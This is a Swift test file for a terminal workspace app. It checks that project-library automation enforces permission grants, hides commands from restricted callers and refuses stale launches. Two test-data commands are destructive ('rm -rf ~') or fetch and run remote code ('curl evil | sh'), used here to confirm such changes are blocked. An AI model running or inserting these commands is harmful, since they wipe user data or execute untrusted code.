import AppKit
import Darwin
import TrellisControl
import TrellisCore
import TrellisTerminal
import XCTest

@testable import TrellisUI

/// Protocol 2 projects over the real model and project library (methods.md#projects, FR-PL): the library through its
/// list model, and launches through the sheet's `ProjectLauncher`. A fake login shell runs the setup command with a fake
/// `git` first on its PATH (as ProjectLaunchFlowTests does) and otherwise echoes what is typed into it.
@MainActor
final class AutomationV2ProjectTests: XCTestCase {
    private var scratch: URL!
    private var v: HarnessV2!
    private var projects: ProjectListModel!
    private var events: [EventDraftV2] = []

    private static let everything = Set(CapabilityV2.allCases)

    override func setUp() async throws {
        _ = NSApplication.shared
        scratch = FileManager.default.temporaryDirectory.appendingPathComponent("trellis-v2pl-\(UUID().uuidString.prefix(8))").resolvingSymlinksInPath()
        try FileManager.default.createDirectory(at: scratch.appendingPathComponent("bin"), withIntermediateDirectories: true)
        let bin = scratch.appendingPathComponent("bin").path
        try """
        #!/bin/sh
        if [ "$1" = "-l" ] && [ "$2" = "-c" ]; then PATH="\(bin):$PATH" exec /bin/sh -c "$3"; fi
        /bin/stty raw -echo
        printf 'SHELL-UP\\n'
        exec /bin/cat -uv
        """.write(toFile: bin + "/fakesh", atomically: true, encoding: .utf8)
        // Records its arguments and whether git may prompt; FAKE_GIT_STATUS fails it, FAKE_GIT_HANG makes it wait.
        try
            "#!/bin/sh\necho \"git $* prompt=${GIT_TERMINAL_PROMPT:-on}\" >> \"\(scratch.path)/git.log\"\n[ -n \"$FAKE_GIT_HANG\" ] && exec sleep 30\n[ \"$1\" = clone ] && for last; do :; done && mkdir -p \"$last/.git\"\nexit ${FAKE_GIT_STATUS:-0}\n"
            .write(toFile: bin + "/git", atomically: true, encoding: .utf8)
        try "#!/bin/sh\nprintf 'AGENT-UP %s\\n' \"$PWD\"\nexec /bin/sleep 30\n".write(toFile: bin + "/fake-agent", atomically: true, encoding: .utf8)
        for tool in ["fakesh", "git", "fake-agent"] { chmod(bin + "/" + tool, 0o755) }

        projects = ProjectListModel(library: ProjectLibrary(storage: MemoryHosts()))
        await projects.load()
        v = try HarnessV2(projects: projects)
        let model = v.model
        model.confirmCloseSessions = { _ in true }
        let saved = await model.saveLaunchSettings(shell: bin + "/fakesh", directory: scratch.path)
        XCTAssertTrue(saved)
        model.agentCatalog = AgentCatalogSnapshot(definitions: [AgentDefinition(id: "fake", name: "Fake", executable: bin + "/fake-agent")])
        model.onProjectLaunched = { [projects] id, target, folder in Task { await projects?.recordLaunch(id, target: target, folder: folder) } }
        model.onLiveEvents = { [weak self] in self?.events.append(contentsOf: $0) }
        // As the app wires it: project events come from the list model's committed changes.
        projects.onProjectsChanged = { [weak self] in self?.events.append(contentsOf: EventDraftV2.projectChanges($0, $1)) }
    }

    override func tearDown() async throws {
        v?.cleanUp()
        v = nil
        try? FileManager.default.removeItem(at: scratch)
    }

    private func grant(_ name: String, _ capabilities: Set<CapabilityV2> = everything, scope: GrantScope = GrantScope()) async throws {
        try await v.grant(name, settings: GrantSettings(name: name, capabilities: capabilities, scope: scope))
    }

    private func until(_ what: String, timeout: TimeInterval = 15, _ condition: () -> Bool) async throws {
        let deadline = Date().addingTimeInterval(timeout)
        while !condition() {
            guard Date() < deadline else { XCTFail("Timed out: \(what)"); throw CancellationError() }
            try await Task.sleep(for: .milliseconds(20))
        }
    }

    private var gitLog: String { (try? String(contentsOf: scratch.appendingPathComponent("git.log"), encoding: .utf8)) ?? "" }
    private func folder(_ name: String) -> String { scratch.appendingPathComponent(name).path }
    private func id(_ project: ProjectDefinition) -> String { project.id.uuidString.lowercased() }
    private static let local: [String: Any] = ["kind": "local"]

    /// Saved the way the app's editor saves it.
    private func save(_ project: ProjectDefinition) async throws -> ProjectDefinition {
        guard case .success(let saved) = await projects.save(project) else { throw XCTSkip("The library refused the project") }
        return saved
    }

    private let shop = ProjectDefinition(
        name: "Shop",
        tabs: [
            ProjectTab(
                title: "API", directory: "api", repository: ProjectRepository(url: "https://github.com/acme/api.git"),
                root: .split(axis: .x, ratio: 0.5, first: .pane(ProjectPane(command: "make dev")), second: .pane(ProjectPane(title: "Shell"))))
        ])

    // MARK: Library

    func testTheLibraryIsReadAndWrittenThroughItsListModelWithRedaction() async throws {
        try await grant("full")
        try await grant("writer", [.projectRead, .projectWrite])
        try await grant("elsewhere", Self.everything, scope: GrantScope(projects: .projects([UUID()])))
        let document: [String: Any] = [
            "name": "Shop", "notes": "Checkout", "repository": ["url": "git@example.com:me/shop.git"],
            "tabs": [
                [
                    "title": "API", "directory": "api",
                    "root": ["type": "split", "axis": "x", "children": [["type": "pane", "command": "make dev"], ["type": "pane", "agent": "fake"]]]
                ]
            ]
        ]
        let refused = try await v.call("project.create", ["document": document], as: "writer")
        XCTAssertEqual(errorCode(refused), "PERMISSION_DENIED")
        XCTAssertEqual(details(refused)?["missing"] as? [String], ["session.execute"])
        let value1 = try await v.code("project.create", ["document": ["name": "Bad", "tabs": [], "version": 1]])
        XCTAssertEqual(value1, "-32602")
        XCTAssertTrue(projects.projects.isEmpty, "Refusals leave the library unchanged")

        let created = object(try await v.ok("project.create", ["document": document]), "project")
        let id = try XCTUnwrap(created["id"] as? String)
        XCTAssertEqual(projects.projects.map(\.name), ["Shop"], "The window's list model holds it")
        XCTAssertEqual(projects.projects.first?.agentCount, 1, "The JSON form carries agent panes (FR-PL10)")
        XCTAssertTrue(events.contains { $0.type == "project.created" && $0.resourceID == id })
        func panes(_ project: [String: Any]) -> [[String: Any]] {
            ((((project["tabs"] as? [[String: Any]])?.first)?["layout"] as? [String: Any])?["children"] as? [[String: Any]]) ?? []
        }
        XCTAssertEqual(panes(created).first?["command"] as? String, "make dev")
        let hidden = object(try await v.ok("project.get", ["id": id], as: "writer"), "project")
        XCTAssertNil(panes(hidden).first?["command"], "Commands need session.execute")
        XCTAssertNil((hidden["tabs"] as? [[String: Any]])?.first?["directory"], "Folders need session.execute")
        XCTAssertEqual(panes(hidden).last?["agent"] as? String, "fake")

        let value2 = try await v.ok("project.list", ["query": "checkout"])
        XCTAssertEqual((value2["projects"] as? [Any])?.count, 1)
        let value3 = try await v.ok("project.list", ["query": "nothing"])
        XCTAssertEqual((value3["projects"] as? [Any])?.count, 0)
        let byURL = try await v.ok("project.list", ["query": "example.com"])
        XCTAssertEqual((byURL["projects"] as? [Any])?.count, 1)
        let byURLHidden = try await v.ok("project.list", ["query": "example.com"], as: "writer")
        XCTAssertEqual((byURLHidden["projects"] as? [Any])?.count, 0, "Repository URLs aren't searchable without session.execute")
        let value4 = try await v.ok("project.list")
        XCTAssertNotNil(value4["revision"])
        let value5 = try await v.ok("project.list", as: "elsewhere")
        XCTAssertEqual((value5["projects"] as? [Any])?.count, 0, "Projects outside scope aren't listed")
        let value6 = try await v.code("project.get", ["id": id], as: "elsewhere")
        XCTAssertEqual(value6, "NOT_FOUND")
        let value7 = try await v.code("project.get", ["id": UUID().uuidString])
        XCTAssertEqual(value7, "NOT_FOUND")

        // A grant that can't read what runs may rename, but not change what runs.
        var renamed = document
        renamed["name"] = "Shop 2"
        let revision = try XCTUnwrap(created["revision"] as? Int)
        let updated = object(try await v.ok("project.update", ["id": id, "document": renamed, "expectedRevision": revision], as: "writer"), "project")
        XCTAssertEqual(updated["name"] as? String, "Shop 2")
        var changed = renamed
        changed["tabs"] = [["title": "API", "root": ["type": "pane", "command": "rm -rf ~"]]]
        let denied = try await v.call("project.update", ["id": id, "document": changed], as: "writer")
        XCTAssertEqual(errorCode(denied), "PERMISSION_DENIED")
        XCTAssertEqual(details(denied)?["missing"] as? [String], ["session.execute"])
        XCTAssertEqual(projects.projects.first?.tabs.first?.root.panes.first?.pane.command, "make dev", "Unchanged")
        let stale = try await v.call("project.update", ["id": id, "document": changed, "expectedRevision": revision])
        XCTAssertEqual(errorCode(stale), "CONFLICT")
        XCTAssertEqual(details(stale)?["currentRevision"] as? Int, updated["revision"] as? Int)
        XCTAssertEqual(projects.projects.first?.name, "Shop 2")

        let value8 = try await v.code("project.delete", ["id": id, "expectedRevision": revision])
        XCTAssertEqual(value8, "CONFLICT")
        let deleted = try await v.ok("project.delete", ["id": id])
        XCTAssertEqual(object(deleted, "deleted")["kind"] as? String, "project")
        XCTAssertTrue(projects.projects.isEmpty)
        let value9 = try await v.code("project.get", ["id": id])
        XCTAssertEqual(value9, "NOT_FOUND")
    }

    func testCaptureMakesAProjectFromASpaceInScope() async throws {
        try await grant("full")
        let space = object(try await v.ok("space.create", ["name": "Scratch"]), "space")
        let spaceID = try XCTUnwrap(space["id"] as? String)
        try await grant("other", Self.everything, scope: GrantScope(spaces: .spaces([UUID()])))
        let value10 = try await v.code("project.capture", ["spaceId": spaceID, "name": "Captured"], as: "other")
        XCTAssertEqual(value10, "NOT_FOUND")
        try await grant("reader", [.workspaceRead, .projectRead])
        let value11 = try await v.code("project.capture", ["spaceId": spaceID, "name": "Captured"], as: "reader")
        XCTAssertEqual(value11, "PERMISSION_DENIED")
        XCTAssertTrue(projects.projects.isEmpty)
        let captured = object(try await v.ok("project.capture", ["spaceId": spaceID, "name": "Captured"]), "project")
        XCTAssertEqual(captured["name"] as? String, "Captured")
        XCTAssertEqual((captured["tabs"] as? [Any])?.count, 1)
        XCTAssertEqual(projects.projects.map(\.name), ["Captured"])
    }

    // MARK: Check and launch

    func testCheckThenLaunchWithSetupOpensASpaceBoundToTheProjectInACreatedScope() async throws {
        let project = try await save(shop)
        try await grant("orchestrator", Self.everything, scope: GrantScope(spaces: .created))
        try await grant("other", Self.everything, scope: GrantScope(spaces: .created))
        let params: [String: Any] = ["id": id(project), "target": Self.local, "folder": folder("work/shop")]
        let plan = object(try await v.ok("project.check", params, as: "orchestrator"), "plan")
        XCTAssertEqual(plan["needsSetup"] as? Bool, true)
        XCTAssertEqual(plan["folderExists"] as? Bool, false)
        XCTAssertEqual((plan["checkouts"] as? [[String: Any]])?.map { $0["state"] as? String }, ["clone"])
        XCTAssertEqual((plan["commands"] as? [[String: Any]])?.first?["command"] as? String, "make dev")
        let revision = try XCTUnwrap(plan["revision"] as? Int)

        let spaces = v.model.snapshot.spaces.count
        let required = try await v.call("project.launch", params.merging(["expectedRevision": revision]) { $1 }, as: "orchestrator")
        XCTAssertEqual(errorCode(required), "SETUP_REQUIRED")
        XCTAssertEqual(object(details(required), "plan")["needsSetup"] as? Bool, true, "The plan rides in the details")
        XCTAssertEqual(v.model.snapshot.spaces.count, spaces, "Nothing was created")
        XCTAssertEqual(gitLog, "", "Nothing ran")

        let launched = try await v.ok("project.launch", params.merging(["setup": true, "expectedRevision": revision]) { $1 }, as: "orchestrator")
        XCTAssertEqual(gitLog, "git clone -- https://github.com/acme/api.git ./api prompt=0\n", "Cloned, with git's prompts off")
        let space = object(launched, "space")
        let spaceID = try XCTUnwrap(space["id"] as? String)
        XCTAssertEqual(object(space, "project")["id"] as? String, id(project))
        XCTAssertEqual(object(space, "project")["name"] as? String, "Shop")
        XCTAssertEqual(object(space, "project")["folder"] as? String, folder("work/shop"))
        XCTAssertEqual(object(space, "project")["target"] as? [String: String], ["kind": "local"])
        let bound = try XCTUnwrap(v.model.snapshot.spaces.first { $0.id.uuidString.lowercased() == spaceID })
        XCTAssertEqual(bound.projectID, project.id, "Bound to the project (FR-W08)")
        let launches = try XCTUnwrap(launched["launches"] as? [[String: Any]])
        XCTAssertEqual(launches.map { $0["paneKey"] as? String }, ["t1-1", "t1-2"])
        XCTAssertEqual(launches.first?["command"] as? Bool, true)
        XCTAssertNil(launches.last?["command"])
        let pane = try XCTUnwrap(UUID(uuidString: try XCTUnwrap(launches.first?["paneId"] as? String)))
        let terminal = try XCTUnwrap(v.model.terminals[pane])
        try await until("the command was typed") { terminal.screenText.contains("make dev") }
        XCTAssertTrue(events.contains { $0.type == "project.launched" && $0.spaceID == bound.id }, "The API's launch is reported like the app's")

        let value12 = try await v.code("space.get", ["id": spaceID], as: "orchestrator")
        XCTAssertEqual(value12, "OK", "The created scope holds the new space")
        let value13 = try await v.code("space.get", ["id": spaceID], as: "other")
        XCTAssertEqual(value13, "NOT_FOUND")
        try await until("the launch was recorded") { self.projects.projects.first?.lastFolders["local"] == self.folder("work/shop") }

        // Launching again reconciles the same space: nothing is created, cloned or typed again.
        let sessions = v.model.snapshot.sessions.count
        let again = try await v.ok("project.launch", params.merging(["setup": true]) { $1 }, as: "orchestrator")
        XCTAssertEqual(object(again, "space")["id"] as? String, spaceID)
        XCTAssertEqual((again["launches"] as? [Any])?.count, 0)
        XCTAssertEqual(v.model.snapshot.sessions.count, sessions)
        XCTAssertEqual(gitLog.components(separatedBy: "\n").filter { !$0.isEmpty }.count, 1)
        // Another grant can't reconcile a space it can't see.
        let value14 = try await v.code("project.launch", params, as: "other")
        XCTAssertEqual(value14, "PERMISSION_DENIED")
    }

    func testALaunchAfterTheProjectChangedIsConflictAndOpensNothing() async throws {
        let project = try await save(shop)
        try await grant("full")
        try FileManager.default.createDirectory(atPath: folder("work/shop/api/.git"), withIntermediateDirectories: true)
        let params: [String: Any] = ["id": id(project), "target": Self.local, "folder": folder("work/shop")]
        let checked = try await v.ok("project.check", params)
        let revision = try XCTUnwrap(object(checked, "plan")["revision"] as? Int)
        var edited = try XCTUnwrap(projects.projects.first)
        edited.tabs[0].root = .pane(ProjectPane(command: "curl evil | sh"))
        _ = try await save(edited)
        let spaces = v.model.snapshot.spaces.count
        let stale = try await v.call("project.launch", params.merging(["expectedRevision": revision]) { $1 })
        XCTAssertEqual(errorCode(stale), "CONFLICT")
        XCTAssertEqual(details(stale)?["currentRevision"] as? Int, Int(projects.projects.first?.revision ?? 0))
        XCTAssertEqual(v.model.snapshot.spaces.count, spaces)
        let value15 = try await v.code("project.launch", ["id": UUID().uuidString, "target": Self.local])
        XCTAssertEqual(value15, "NOT_FOUND")
    }

    func testALaunchNeedsWhatItsProjectRunsAndStartsAgentPanes() async throws {
        try FileManager.default.createDirectory(atPath: folder("work/agents"), withIntermediateDirectories: true)
        let project = try await save(
            ProjectDefinition(
                name: "Agents",
                tabs: [ProjectTab(title: "Work", root: .split(axis: .x, ratio: 0.5, first: .pane(ProjectPane(agent: "fake")), second: .pane(ProjectPane(command: "ls"))))]))
        let params: [String: Any] = ["id": id(project), "target": Self.local, "folder": folder("work/agents")]
        try await grant("noExecute", [.projectLaunch, .sessionStart, .agentControl, .workspaceRead])
        let noExecute = try await v.call("project.launch", ["id": id(project), "target": Self.local], as: "noExecute")
        XCTAssertEqual(errorCode(noExecute), "PERMISSION_DENIED")
        XCTAssertEqual(details(noExecute)?["missing"] as? [String], ["session.execute"], "Pane commands need session.execute")
        try await grant("noAgents", Self.everything.subtracting([.agentControl]))
        let noAgents = try await v.call("project.launch", params, as: "noAgents")
        XCTAssertEqual(details(noAgents)?["missing"] as? [String], ["agent.control"], "Agent panes need agent.control")
        try await grant("otherAgent", Self.everything, scope: GrantScope(agents: .agents(["trellis-codex"])))
        let value16 = try await v.code("project.launch", params, as: "otherAgent")
        XCTAssertEqual(value16, "PERMISSION_DENIED", "Each agent must be in the agent scope")
        XCTAssertFalse(v.model.snapshot.spaces.contains { $0.projectID == project.id }, "Refusals open nothing")

        try await grant("full")
        let launched = try await v.ok("project.launch", params)
        let launches = try XCTUnwrap(launched["launches"] as? [[String: Any]])
        XCTAssertEqual(launches.first?["agentId"] as? String, "fake")
        let agentPane = try XCTUnwrap(UUID(uuidString: try XCTUnwrap(launches.first?["paneId"] as? String)))
        XCTAssertEqual(v.model.agentLaunch(paneID: agentPane), AgentLaunch(agentID: "fake", directory: folder("work/agents")))
        XCTAssertFalse(v.model.agentInstallPanes.contains(agentPane), "A project's agent pane never carries an installer request")
        let terminal = try XCTUnwrap(v.model.terminals[agentPane])
        try await until("the agent started") { terminal.screenText.contains("AGENT-UP") }
    }

    func testAFailedOrStuckSetupIsLaunchFailedAndOpensNothing() async throws {
        let project = try await save(shop)
        try await grant("full")
        setenv("FAKE_GIT_STATUS", "128", 1)
        defer { unsetenv("FAKE_GIT_STATUS") }
        let spaces = v.model.snapshot.spaces.count
        let failed = try await v.call("project.launch", ["id": id(project), "target": Self.local, "folder": folder("broken"), "setup": true])
        XCTAssertEqual(errorCode(failed), "LAUNCH_FAILED")
        XCTAssertEqual(object(details(failed), "setup")["exitCode"] as? Int, 128)
        XCTAssertEqual(object(details(failed), "setup")["timedOut"] as? Bool, false)
        XCTAssertEqual(v.model.snapshot.spaces.count, spaces)
        XCTAssertTrue(v.model.automationSetupTerminals.isEmpty)

        unsetenv("FAKE_GIT_STATUS")
        setenv("FAKE_GIT_HANG", "1", 1)
        defer { unsetenv("FAKE_GIT_HANG") }
        v.model.automationSetupLimit = .milliseconds(500)
        let stuck = try await v.call("project.launch", ["id": id(project), "target": Self.local, "folder": folder("slow"), "setup": true])
        XCTAssertEqual(errorCode(stuck), "LAUNCH_FAILED")
        XCTAssertEqual(object(details(stuck), "setup")["timedOut"] as? Bool, true, "Ended: nobody can answer a prompt it waits on")
        XCTAssertEqual(v.model.snapshot.spaces.count, spaces)
        XCTAssertTrue(v.model.automationSetupTerminals.isEmpty)
    }

    /// A space's project is missing only when the loaded library lacks it; a library that hasn't loaded says nothing.
    func testAProjectIsMissingOnlyFromALoadedLibrary() async throws {
        try FileManager.default.createDirectory(atPath: folder("work/plain"), withIntermediateDirectories: true)
        let project = try await save(ProjectDefinition(name: "Plain"))
        try await grant("full")
        let launched = try await v.ok("project.launch", ["id": id(project), "target": Self.local, "folder": folder("work/plain")])
        let spaceID = try XCTUnwrap(UUID(uuidString: try XCTUnwrap(object(launched, "space")["id"] as? String)))
        let value17 = try await v.ok("space.get", ["id": spaceID.uuidString])
        XCTAssertNil(object(object(value17, "space"), "project")["missing"])
        let value18 = await projects.delete(try XCTUnwrap(projects.projects.first))
        XCTAssertNil(value18)
        let value19 = try await v.ok("space.get", ["id": spaceID.uuidString])
        XCTAssertEqual(object(object(value19, "space"), "project")["missing"] as? Bool, true)

        let unloaded = ProjectListModel(library: ProjectLibrary(storage: MemoryHosts()))
        let service = AutomationServiceV2(model: v.model, hosts: v.base.hosts, projects: unloaded)
        XCTAssertEqual(service.runtime(spaces: nil).spaces[spaceID]?.projectMissing, false, "Not loaded: nothing is known missing")
        let value20 = try await v.code("project.list")
        XCTAssertEqual(value20, "OK")
        XCTAssertEqual(service.currentRevision(.resource(.project, project.id)), nil)
    }

    /// Nobody sees an API setup's terminal: git never prompts, and ssh runs in batch mode unless the user chose how git runs ssh.
    func testAPISetupNeverWaitsForAPrompt() {
        XCTAssertEqual(AutomationServiceV2.setupEnvironment([:], sshCommandConfigured: false), ["GIT_TERMINAL_PROMPT": "0", "GIT_SSH_COMMAND": "ssh -o BatchMode=yes"])
        XCTAssertEqual(AutomationServiceV2.setupEnvironment(["GIT_SSH_COMMAND": "ssh -i ~/.ssh/deploy"], sshCommandConfigured: false), ["GIT_TERMINAL_PROMPT": "0"])
        XCTAssertEqual(AutomationServiceV2.setupEnvironment(["GIT_SSH": "/usr/local/bin/my-ssh"], sshCommandConfigured: false), ["GIT_TERMINAL_PROMPT": "0"])
        XCTAssertEqual(AutomationServiceV2.setupEnvironment([:], sshCommandConfigured: true), ["GIT_TERMINAL_PROMPT": "0"], "core.sshCommand is never overridden")
    }
}
